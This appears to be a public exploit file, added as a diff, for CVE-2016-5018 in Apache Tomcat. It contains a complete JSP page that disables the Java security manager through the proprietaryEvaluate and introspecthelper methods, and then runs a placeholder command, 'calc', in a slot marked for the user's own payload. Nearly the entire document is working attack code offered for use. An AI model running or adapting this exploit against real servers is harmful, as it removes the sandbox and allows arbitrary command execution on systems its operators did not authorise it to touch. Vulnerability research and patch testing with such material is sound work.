@@ -1,0 +1,83 @@
+# Exploit Title: Tomcat proprietaryEvaluate 9.0.0.M1 - Sandbox Escape
+# Date: 2020-01-07
+# Exploit Author: Harrison Neal, PatchAdvisor
+# Vendor Homepage: https://tomcat.apache.org/
+# Software Link: https://archive.apache.org/dist/tomcat/tomcat-8/v8.0.36/bin/apache-tomcat-8.0.36.exe
+# Version: 8.0.36
+# Description: Tomcat proprietaryEvaluate/introspecthelper Sandbox Escape
+# Tested on: Windows 
+# CVE: CVE-2016-5018
+ /*   
+# See https://tomcat.apache.org/tomcat-8.0-doc/security-manager-howto.html for more information about the default sandbox.   
+# When Tomcat 8 is configured to run as a service, you can use the Tomcat8w.exe tool to enable/disable the security manager.
+# In the Java tab, add the following options:
+# -Djava.security.manager
+# -Djava.security.policy=C:\Program Files\Apache Software Foundation\Tomcat 8.0\conf\catalina.policy
+ */
+ 
+ <%@ page import="java.util.*,java.io.*,org.apache.jasper.runtime.*,java.lang.reflect.*"%>
+<%   
+    SecurityManager sm = System.getSecurityManager();
+    
+    if (sm != null) {
+        try {
+            ProtectedFunctionMapper pfm = ProtectedFunctionMapper.getInstance();
+
+            { // Tomcat 7+
+                // Get the desired method
+                Method[] methods = (Method[]) PageContextImpl.proprietaryEvaluate(
+                        "${pageContext.getServletContext().getClass().getDeclaredMethods()}",
+                        Method[].class, pageContext, pfm /*, false*/); // Uncomment "false" parameter for Tomcat 7
+
+                Method theMethod = null;
+
+                for (Method m : methods) {
+                    if ("executeMethod".equals(m.getName())) {
+                        theMethod = m;
+                        break;
+                    }
+                }
+
+                // Set it to accessible
+                JspRuntimeLibrary.introspecthelper(
+                        theMethod,
+                        "accessible",
+                        "true",
+                        request,
+                        null,
+                        false);
+
+                // Run it
+                theMethod.invoke(pageContext.getServletContext(),
+                        System.class.getMethod("setSecurityManager", new Class[]{SecurityManager.class}),
+                        null,
+                        new Object[]{null}
+                );
+            }
+            
+            /*{ // Tomcat 5.5 and 6
+                pfm.mapFunction("hello:world", System.class, "setSecurityManager", new Class[] { SecurityManager.class });
+                PageContextImpl.proprietaryEvaluate("${hello:world(null)}", Object.class, pageContext, pfm, false);
+            }*/
+            
+        } catch (Throwable ex) {
+            PrintWriter pw = new PrintWriter(out);
+            ex.printStackTrace(pw);
+            pw.flush();
+        }
+    }
+    
+    // Your payload goes here
+    try {
+        Runtime.getRuntime().exec("calc");
+    } catch (Throwable ex) {
+        PrintWriter pw = new PrintWriter(out);
+        ex.printStackTrace(pw);
+        pw.flush();
+    }
+    
+    // Optional put the security manager back
+    if (sm != null) {
+        System.setSecurityManager(sm);
+    }
+%>
